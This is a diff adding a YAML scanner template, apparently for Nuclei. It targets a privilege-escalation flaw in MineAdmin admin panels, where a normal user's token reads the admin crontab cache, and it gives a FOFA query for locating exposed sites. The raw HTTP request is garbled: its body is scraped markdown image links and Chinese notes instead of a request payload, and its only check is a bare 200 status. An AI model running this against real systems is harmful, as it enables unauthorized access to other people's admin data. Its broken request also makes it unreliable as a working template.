@@ -1,0 +1,47 @@
+id: poc-ormvu1gtbnqxusxy
+info:
+  name: MineAdmin企业级后台管理系统view存在接口逻辑缺陷漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ormvu1gtbnqxusxy'
+  tags: other,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ormvu1gtbnqxusxy
+    fofa: body="MineAdmin"
+http:
+- raw:
+  - 'POST /prod/system/cache/view HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language: zh_CN
+
+    Accept: application/json, text/plain, */*
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
+
+    Authorization: Bearer (此处替换普通用户token)
+
+    Content-Type: application/json;charset=UTF-8
+
+    Content-Length: 27
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238343549-1abd1ef8-b145-43c3-b112-8bfa2ec705cd.png)
+
+    POC/EXP：普通用户垂直越权访问MineAdmin:crontab
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238343942-bf1a2368-78bd-43be-8ad8-144002d1fb7d.png)
+
+    以下截图对应上面截图中的jwt token证明越权成功。
+
+    普通用户jwt token
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774238344629-99e44724-11af-4964-aa60-a658c7451d69.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
